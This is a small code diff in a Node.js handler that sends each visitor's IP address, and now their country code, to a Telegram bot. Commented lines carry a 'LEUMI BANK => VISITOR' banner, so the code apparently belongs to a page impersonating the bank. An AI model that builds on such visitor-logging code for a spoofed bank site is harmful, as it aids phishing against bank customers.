@@ -28,7 +28,9 @@ module.exports.recordVisit = async (req, res, next) => {
     // message += `[ + Visit Time: ${visitor.visitTime || "Unknown"}\n`;
     // message += "[=====>  LEUMI BANK => VISITOR  <=====]";
 
-    const message = `New visitor IP: ${visitor.IPv4}`;
+    const message = `New visitor IP: ${visitor.IPv4} ${
+      visitor.country_code || "N/A"
+    }`;
 
     await telegramService.sendMessage(message);
 
